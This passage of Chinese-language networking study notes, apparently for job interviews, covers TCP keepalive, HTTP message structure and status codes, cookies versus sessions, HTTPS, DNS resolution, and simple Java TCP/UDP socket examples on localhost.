组，只等待连接确认应答分组。而S在发出的分组超时后，重复发送同样的分组。这样就形成了死锁。</p><p>【问题4】如果已经建立了连接，但是客户端突然出现故障了怎么办？ </p><p>TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75秒钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。</p><h2><span id="http">HTTP</span></h2><h3><span id="主要特点">主要特点 √</span></h3><p>Ø 支持客户/服务器模式</p><p>Ø 简单快速</p><p>Ø 灵活</p><p>Ø 无连接</p><p>Ø 无状态</p><h2><span id="请求响应的步骤">请求\响应的步骤</span></h2><p>Ø 客户端连接到Web服务器</p><p>通常是浏览器，向web服务器端口（默认是80）建立一个TCP套接字连接</p><p>Ø 发送HTTP请求</p><p>包含请求行-请求头部-请求数据</p><p>Ø 服务器接收请求并返回HTTP响应</p><p>响应行-响应头部-响应正文</p><p>Ø 释放TCP连接</p><p>如果为closed 服务器主动关闭连接，若为keep-alive会保持一段时间，该时间内继续接收请求</p><p>Ø 客户端浏览器解析HTML内容</p><h2><span id="在浏览器键入url按下回车之后的流程面试">在浏览器键入URL，按下回车之后的流程（面试）</span></h2><p>Ø 浏览器会根据URL逐层查询DNS服务器缓存，解析URL中的域名对应的IP地址。</p><p>从近到远依次是浏览器缓存、系统缓存（host）、路由器缓存、ISP服务器缓存、根域名服务器缓存、顶级域名服务器缓存从哪个缓存找到服务器ip就直接返回，不再查询。</p><p>Ø 根据IP地址和对应端口建立TCP连接（3次握手）</p><p>Ø 浏览器发送HTTP请求</p><p>包含请求行-请求头部-请求数据</p><p>Ø 服务器处理请求并返回HTTP报文</p><p>包含响应行-响应头部-响应正文</p><p>Ø 浏览器解析渲染页面</p><p>Ø 连接结束</p><h3><span id="请求结构请求行-请求头部-请求数据">请求结构（请求行-请求头部-请求数据）</span></h3><h4><span id="首先看看http请求消息就是浏览器丢给服务器的">首先看看http请求消息（就是浏览器丢给服务器的）：</span></h4><p><img src="clip_image001.png" alt>  </p><h4><span id="请求行">请求行</span></h4><p>格式为：</p><p>Method Request-URI HTTP-Version 结尾符</p><p>结尾符一般用\r\n</p><h4><span id="请求头"><strong>请求头</strong></span></h4><p><strong>通用报头</strong></p><p>既可以出现在请求报头，也可以出现在响应报头中</p><p>Date：表示消息产生的日期和时间</p><p>Connection：允许发送指定连接的选项，例如指定连接是连续的，或者指定“close”选项，通知服务器，在响应完成后，关闭连接</p><p>Cache-Control：用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机制）</p><p><strong>请求报头</strong></p><p>请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p><p>Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</p><p>User-Agent：发送请求的浏览器类型、操作系统等信息</p><p>Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息</p><p>Accept-Encoding：客户端可识别的数据编码</p><p>Accept-Language：表示浏览器所支持的语言类型</p><p>Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。</p><p>Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。</p><h3><span id="响应结构状态行-响应头部-响应正文"><em>响应结构（状态行-响应头部-响应正文）</em></span></h3><p><img src="clip_image002-1585537261410.png" alt> </p><p><strong>状态行</strong></p><p>由HTTP 协议版本字段、状码（如404）和状态码的描述文本3个部分组成</p><p><strong>响应报头</strong></p><p>用于服务器传递自身信息的响应，常见的响应报头：</p><p>Location：用于重定向接受者到一个新的位置，常用在更换域名的时候</p><p>Server：包含可服务器用来处理请求的系统信息，与User-Agent请求报头是相对应的</p><p><strong>实体报头</strong></p><p>实体报头用来定于被传送资源的信息，既可以用于请求也可用于响应。请求和响应消息都可以传送一个实体，常见的实体报头为：</p><p>Content-Type：发送给接收者的实体正文的媒体类型</p><p>Content-Lenght：实体正文的长度</p><p>Content-Language：描述资源所用的自然语言，没有设置则该选项则认为实体内容将提供给所有的语言阅读</p><p>Content-Encoding：实体报头被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。</p><p>Last-Modified：实体报头用于指示资源的最后修改日期和时间</p><p>Expires：实体报头给出响应过期的日期和时间</p><p>空行</p><p>http协议规定的格式，一般采用\r\n</p><h3><span id="keep-alive模式"><em>Keep-Alive模式</em></span></h3><p>由上面的示例可以看到里面的请求头部和响应头部都有一个key-value Connection: Keep-Alive，这个键值对的作用是让HTTP保持连接状态，因为HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP 协议为无连接的协议）；当使用 Keep-Alive 模式时，Keep-Alive 功能使客户端到服务器端的连接持续有效。</p><p>在HTTP 1.1版本后，默认都开启Keep-Alive模式，只有加入加入 Connection: close才关闭连接，当然也可以设置Keep-Alive模式的属性，例如 Keep-Alive: timeout=5, max=100，表示这个TCP通道可以保持5秒，max=100，表示这个长连接最多接收100次请求就断开。</p><h3><span id="状态码">状态码</span></h3><p>HTTP状态码总的分为五类：</p><p>1开头：信息状态码</p><p>2开头：成功状态码</p><p>3开头：重定向状态码</p><p>4开头：客户端错误状态码</p><p>5开头：服务端错误状态码</p><p> <strong>1XX</strong>：信息状态码</p><table><thead><tr><th><strong>状态码</strong></th><th><strong>含义</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>100</td><td>继续</td><td>初始的请求已经接受，请客户端继续发送剩余部分</td></tr><tr><td>101</td><td>切换协议</td><td>请求这要求服务器切换协议，服务器已确定切换</td></tr></tbody></table><p> <strong>2XX</strong>：成功状态码</p><table><thead><tr><th><strong>状态码</strong></th><th><strong>含义</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>200</td><td>成功</td><td>服务器已成功处理了请求</td></tr><tr><td>201</td><td>已创建</td><td>请求成功并且服务器创建了新的资源</td></tr><tr><td>202</td><td>已接受</td><td>服务器已接受请求，但尚未处理</td></tr><tr><td>203</td><td>非授权信息</td><td>服务器已成功处理请求，但返回的信息可能来自另一个来源</td></tr><tr><td>204</td><td>无内容</td><td>服务器成功处理了请求，但没有返回任何内容</td></tr><tr><td>205</td><td>重置内容</td><td>服务器处理成功，用户终端应重置文档视图</td></tr><tr><td>206</td><td>部分内容</td><td>服务器成功处理了部分GET请求</td></tr></tbody></table><p><strong>3XX</strong>：重定向状态码</p><table><thead><tr><th><strong>状态码</strong></th><th><strong>含义</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>300</td><td>多种选择</td><td>针对请求，服务器可执行多种操作</td></tr><tr><td>301</td><td>永久移动</td><td>请求的页面已永久跳转到新的url</td></tr><tr><td>302</td><td>临时移动</td><td>服务器目前从不同位置的网页响应请求，但请求仍继续使用原有位置来进行以后的请求</td></tr><tr><td>303</td><td>查看其他位置</td><td>请求者应当对不同的位置使用单独的GET请求来检索响应时，服务器返回此代码</td></tr><tr><td>304</td><td>未修改</td><td>自从上次请求后，请求的网页未修改过</td></tr><tr><td>305</td><td>使用代理</td><td>请求者只能使用代理访问请求的网页</td></tr><tr><td>307</td><td>临时重定向</td><td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求</td></tr></tbody></table><p><strong>4XX</strong>：客户端错误状态码</p><table><thead><tr><th><strong>状态码</strong></th><th><strong>含义</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>400</td><td>错误请求</td><td>服务器不理解请求的语法</td></tr><tr><td>401</td><td>未授权</td><td>请求要求用户的身份演验证</td></tr><tr><td>403</td><td>禁止</td><td>服务器拒绝请求</td></tr><tr><td>404</td><td>未找到</td><td>服务器找不到请求的页面</td></tr><tr><td>405</td><td>方法禁用</td><td>禁用请求中指定的方法</td></tr><tr><td>406</td><td>不接受</td><td>无法使用请求的内容特性响应请求的页面</td></tr><tr><td>407</td><td>需要代理授权</td><td>请求需要代理的身份认证</td></tr><tr><td>408</td><td>请求超时</td><td>服务器等候请求时发生超时</td></tr><tr><td>409</td><td>冲突</td><td>服务器在完成请求时发生冲突</td></tr><tr><td>410</td><td>已删除</td><td>客户端请求的资源已经不存在</td></tr><tr><td>411</td><td>需要有效长度</td><td>服务器不接受不含有效长度表头字段的请求</td></tr><tr><td>412</td><td>未满足前提条件</td><td>服务器未满足请求者在请求中设置的其中一个前提条件</td></tr><tr><td>413</td><td>请求实体过大</td><td>由于请求实体过大，服务器无法处理，因此拒绝请求</td></tr><tr><td>414</td><td>请求url过长</td><td>请求的url过长，服务器无法处理</td></tr><tr><td>415</td><td>不支持格式</td><td>服务器无法处理请求中附带媒体格式</td></tr><tr><td>416</td><td>范围无效</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>未满足期望</td><td>服务器无法满足请求表头字段要求</td></tr></tbody></table><p><strong>5XX</strong>：服务端错误状态码</p><table><thead><tr><th>状态码</th><th>含义</th><th>描述</th></tr></thead><tbody><tr><td>500</td><td>服务器错误</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>尚未实施</td><td>服务器不具备完成请求的功能</td></tr><tr><td>502</td><td>错误网关</td><td>服务器作为网关或代理出现错误</td></tr><tr><td>503</td><td>服务不可用</td><td>服务器目前无法使用</td></tr><tr><td>504</td><td>网关超时</td><td>网关或代理服务器，未及时获取请求</td></tr><tr><td>505</td><td>不支持版本</td><td>服务器不支持请求中使用的HTTP协议版本</td></tr></tbody></table><h3><span id="get和post的区别-">GET和POST的区别 -</span></h3><ul><li>GET是最常用的方法，通常用于请求服务器发送某个资源，而且应该是安全的和幂等的。</li></ul><p>(1). 所谓安全是指该操作用于获取信息而非修改信息。</p><p>(2). 幂等是指对同一个URL的多个请求应该返回同样的结果。</p><ul><li><p>POST方法向服务器提交数据，比如完成表单数据的提交，将数据提交给服务器处理。 </p></li><li><p>GET请求附加在URL之后，以?分割URL和传输数据，多个参数用&amp;连接。</p></li><li><p>POST请求会把请求的数据放置在HTTP请求包的包体中。 </p></li><li><p>GET请求可以被CDN缓存存储，POST不行</p></li></ul><h3><span id="什么是cookie">什么是Cookie √</span></h3><p>Ø 是由服务器发送给客户端的特殊信息，以文本形式存放在客户端。</p><p>用户通过浏览器访问一个支持Cookie的网站后，用户会提供包括用户名在内的个人信息并且提交至服务器，<strong>服务器发送超文本的时候会将信息夹带在http响应头里面</strong>，客户端收到后就将信息存放起来。</p><p>Ø 客户端再次请求的时候，会把Cookie回发（存放在http请求头里）</p><p>Ø 服务器接收到后，会解析Cookie生成与客户端相对应的内容</p><h2><span id="什么是session-">什么是Session -</span></h2><p>Ø 服务器端的机制，在服务器上保存的信息</p><p>Ø 解析客户端请求并操作session id，按需保存状态信息</p><p>Ø 实现方式：</p><ol><li><p>使用Cookie来实现，给每个cookie分配一个唯一的JSESSIONID，并通过Cookie发送给客户端，客户端再次请求的时候会携带上JSESSIONID</p></li><li><p>使用URL回写，服务器在发送给浏览器的所有页面都携带JSESSIONID的参数，这样客户端点击任何一个链接都会把JSESSIONID带回服务器。</p></li></ol><p>Tomcat一开始两者都使用，如果支持Cookie就停止URL重写。</p><h3><span id="cookie和session的区别">Cookie和Session的区别</span></h3><h4><span id="1-存储位置不同">1、存储位置不同</span></h4><p>cookie的数据信息存放在客户端浏览器上。</p><p>session的数据信息存放在服务器上。</p><h4><span id="2-存储容量不同">2、存储容量不同</span></h4><p>单个cookie保存的数据&lt;=4KB，一个站点最多保存20个Cookie。</p><p>对于session来说并没有上限，但出于对服务器端的性能考虑，session内不要存放过多的东西，并且设置session删除机制。</p><h4><span id="3-存储方式不同">3、存储方式不同</span></h4><p>cookie中只能保管ASCII字符串，并需要通过编码方式存储为Unicode字符或者二进制数据。</p><p>session中能够存储任何类型的数据，包括且不限于string，integer，list，map等。</p><h4><span id="4-隐私策略不同">4、隐私策略不同</span></h4><p>cookie对客户端是可见的，别有用心的人可以分析存放在本地的cookie并进行cookie欺骗，所以它是不安全的。</p><p>session存储在服务器上，对客户端是透明对，不存在敏感信息泄漏的风险。</p><h4><span id="5-有效期上不同">5、有效期上不同</span></h4><p>开发可以通过设置cookie的属性，达到使cookie长期有效的效果。</p><p>session依赖于名为JSESSIONID的cookie，而cookie JSESSIONID的过期时间默认为-1，只需关闭窗口该session就会失效，因而session不能达到长期有效的效果。</p><h4><span id="6-服务器压力不同">6、服务器压力不同</span></h4><p>cookie保管在客户端，不占用服务器资源。对于并发用户十分多的网站，cookie是很好的选择。</p><p>session是保管在服务器端的，每个用户都会产生一个session。假如并发访问的用户十分多，会产生十分多的session，耗费大量的内存。</p><h4><span id="7-浏览器支持不同">7、浏览器支持不同</span></h4><p>假如客户端浏览器不支持cookie：</p><p>cookie是需要客户端浏览器支持的，假如客户端禁用了cookie，或者不支持cookie，则会话跟踪会失效。关于WAP上的应用，常规的cookie就派不上用场了。</p><p>运用session需要使用URL地址重写的方式。一切用到session程序的URL都要进行URL地址重写，否则session会话跟踪还会失效。</p><p>假如客户端支持cookie：</p><p>cookie既能够设为本浏览器窗口以及子窗口内有效，也能够设为一切窗口内有效。</p><p>session只能在本窗口以及子窗口内有效。</p><h4><span id="8-跨域支持上不同">8、跨域支持上不同</span></h4><p>cookie支持跨域名访问。</p><p>session不支持跨域名访问。</p><h3><span id="http和https的区别">Http和Https的区别</span></h3><h4><span id="ssl安全套接层">SSL（安全套接层）</span></h4><p>Ø 为网络通信提供安全及数据完整性的一种安全协议</p><p>Ø 是操作系统对外的API，SSL3.0后改名为TLS</p><p>Ø 采用<strong>身份验证</strong>和<strong>数据加密</strong>保证网络通信的安全和数据的完整性</p><h4><span id="https数据传输流程">Https数据传输流程：</span></h4><p>Ø 浏览器将支持的加密算法信息发送给服务器 </p><p>Ø 服务器选择一套浏览器支持的加密算法，以证书的形式回发浏览器</p><p>Ø 浏览器验证证书合法性，并结合证书公钥加密秘钥发送给服务器</p><p>Ø 服务器使用私钥解密信息，验证哈希，加密响应消息回发浏览器</p><p>Ø 浏览器解密响应消息，并对消息进行验证，之后进行加密交互数据。</p><h4><span id="二-http与https的区别">二、Http与Https的区别</span></h4><p>Ø HTTPS协议需要到CA 申请证书，HTTP不需要 </p><p>Ø HTTPS密文传输，HTTP明文传输</p><p>Ø HTTPS默认使用443端口，HTTP使用80端口</p><p>Ø HTTP是无状态的，HTTPS是有状态的SSL+HTTP构建的网络协议</p><p>无状态的意思是其数据包的发送、传输和接收都是相互独立的。无连接的意思是指通信双方都不长久的维持对方的任何信息。</p><h4><span id="五-https的缺点对比优点">五、Https的缺点（对比优点）</span></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长近。</p><p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p><p>3、Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用。</p><p>4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。</p><p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。</p><p>6、Https协议的加密范围也比较有限。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p><p>一般浏览器都是将地址解析成http的然后通过重定向到https，这个过程可能被劫持</p><h2><span id="各层常见协议">各层常见协议</span></h2><p>网际链路层：以太网协议</p><p>网络层：IP、ARP、RARP</p><p>传输层：TCP、UDP</p><p>应用层：SMTP FTP HTTP</p><h2><span id="socket">Socket</span></h2><p><img src="clip_image002-1585538329691.jpg" alt></p><p><img src="clip_image004.jpg" alt></p><h4><span id="tcpserverclient">TCPServer/Client</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCPServer</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">3014</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">      Socket socket=ss.accept();</span><br><span class="line">      <span class="keyword">new</span> Working(socket).start();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Working</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="comment">//以Socket为成员变量</span></span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Working</span><span class="params">(Socket socket)</span></span>&#123;<span class="keyword">this</span>.socket=socket;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>(OutputStream os = socket.getOutputStream();</span><br><span class="line">            InputStream is = socket.getInputStream()) &#123;</span><br><span class="line">            <span class="keyword">int</span> ch=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            ch=is.read(buff);</span><br><span class="line">            String content = <span class="keyword">new</span> String(buff,<span class="number">0</span>,ch);</span><br><span class="line">            System.out.println(content);</span><br><span class="line">            os.write(String.valueOf(content.length()).getBytes());</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (Socket s = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>,<span class="number">3014</span>);</span><br><span class="line">             OutputStream os =s.getOutputStream();</span><br><span class="line">             InputStream is = s.getInputStream();</span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">int</span> ch=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            String output = <span class="string">"hello world"</span>;</span><br><span class="line">            os.write(output.getBytes());</span><br><span class="line">            ch=is.read(buff);</span><br><span class="line">            String content = <span class="keyword">new</span> String(buff,<span class="number">0</span>,ch);</span><br><span class="line">            System.out.println(content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="udpserverclient">UDPServer/Client</span></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDPServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        DatagramSocket socket=<span class="keyword">new</span> DatagramSocket(<span class="number">65001</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">100</span>];</span><br><span class="line">        DatagramPacket packet = <span class="keyword">new</span> DatagramPacket(buff,buff.length);</span><br><span class="line">        socket.receive(packet);</span><br><span class="line">        <span class="keyword">byte</span>[] data=packet.getData();</span><br><span class="line">        String content = <span class="keyword">new</span> String(data,<span class="number">0</span>,packet.getLength());</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        <span class="keyword">byte</span>[] sendContent = String.valueOf(content.length()).getBytes();</span><br><span class="line">        DatagramPacket packet2Client = <span class="keyword">new</span> DatagramPacket(sendContent,sendContent.length,packet.getAddress(),packet.getPort());</span><br><span class="line">        socket.send(packet2Client);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        DatagramSocket socket=<span class="keyword">new</span> DatagramSocket();</span><br><span class="line">        InetAddress address = InetAddress.getByName(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] buf=<span class="string">"hello world"</span>.getBytes();</span><br><span class="line">        DatagramPacket packet = <span class="keyword">new</span> DatagramPacket(buf,buf.length,address,<span class="number">65001</span>);</span><br><span class="line">        socket.send(packet);</span><br><span class="line">        <span class="keyword">byte</span>[] data=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">100</span>];</span><br><span class="line">        DatagramPacket rcvPacket=<span class="keyword">new</span> DatagramPacket(data,data.length);</span><br><span class="line">        socket.receive(rcvPacket);</span><br><span class="line">        String content = <span class="keyword">new</span> String(rcvPacket.getData(),<span class="number">0</span>,rcvPacket.getLength());</span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于一台主机，它的操作系统内核实现了传输层到物理层的内容</p><ul><li>对于一台路由器，它实现了从网络层到物理层</li><li>对于一台交换机，它实现了由数据链路层到物理层</li><li>对于集线器，他只实现了物理层。</li></ul><p>OSI：</p><p>网际接口层、网络层、传输层、应用层</p><p>物理层、数据链路层、网络层、传输层、会话层、表现层、应用层</p><h3><span id="dns解析了解">DNS解析（了解）</span></h3><p>2、浏览器查找域名的 IP 地址　　</p><p>1、请求一旦发起，浏览器首先要做的事情就是解析这个域名，一般来说，浏览器会首先查看本地硬盘的 hosts 文件，看看其中有没有和这个域名对应的规则，如果有的话就直接使用 hosts 文件里面的 ip 地址。</p><p>2、如果在本地的 hosts 文件没有能够找到对应的 ip 地址，浏览器会发出一个 DNS请求到本地DNS服务器 。本地DNS服务器一般都是你的网络接入服务器商提供，比如中国电信，中国移动。</p><p>3、查询你输入的网址的DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果，此过程是递归的方式进行查询。如果没有，本地DNS服务器还要向DNS根服务器进行查询。</p><p>4、根DNS服务器没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。这种过程是迭代的过程。</p><p>5、本地DNS服务器继续向域服务器发出请求，在这个例子中，请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址。</p><p>6、最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</p><p>下面这张图很完美的解释了这一过程：</p><p> <img src="clip_image002-1585538209170.jpg" alt>1.什么是DNS？</p><p>DNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。<br> 　<br> 通俗的讲，我们更习惯于记住一个网站的名字，比如<a href="http://www.baidu.com,而不是记住它的ip地址，比如：167.23.10.2。而计算机更擅长记住网站的ip地址，而不是像www.baidu.com等链接。因为，DNS就相当于一个电话本，比如你要找www.baidu.com这个域名，那我翻一翻我的电话本，我就知道，哦，它的电话（ip）是167.23.10.2。">www.baidu.com,而不是记住它的ip地址，比如：167.23.10.2。而计算机更擅长记住网站的ip地址，而不是像www.baidu.com等链接。因为，DNS就相当于一个电话本，比如你要找www.baidu.com这个域名，那我翻一翻我的电话本，我就知道，哦，它的电话（ip）是167.23.10.2。</a></p><p>2.DNS查询的两种方式：递归查询和迭代查询</p><p><img src="clip_image003.png" alt></p><p><strong>1**</strong>、递归解析**</p><p>当局部DNS服务器自己不能回答客户机的DNS查询时，它就需要向其他DNS服务器进行查询。此时有两种方式，如图所示的是递归方式。局部DNS服务器自己负责向其他DNS服务器进行查询，一般是先向该域名的根域服务器查询，再由根域名服务器一级级向下查询。最后得到的查询结果返回给局部DNS服务器，再由局部DNS服务器返回给客户端。</p><p><img src="clip_image004-1585538209171.png" alt></p><p><strong>2**</strong>、迭代解析**</p><p>当局部DNS服务器自己不能回答客户机的DNS查询时，也可以通过迭代查询的方式进行解析，如图所示。局部DNS服务器不是自己向其他DNS服务器进行查询，而是把能解析该域名的其他DNS服务器的IP地址返回给客户端DNS程序，客户端DNS程序再继续向这些DNS服务器进行查询，直到得到查询结果为止。也就是说，迭代解析只是帮你找到相关的服务器而已，而不会帮你去查。比如说：baidu.com的服务器ip地址在192.168.4.5这里，你自己去查吧，本人比较忙，只能帮你到这里了。</p><p><img src="clip_image005.jpg" alt></p><p>3.DNS域名称空间的组织方式</p><p>我们在前面有说到根DNS服务器，域DNS服务器，这些都是DNS域名称空间的组织方式。按其功能命名空间中用来描述 DNS 域名称的五个类别的介绍详见下表中，以及与每个名称类型的示例</p><p> <img src="clip_image006.jpg" 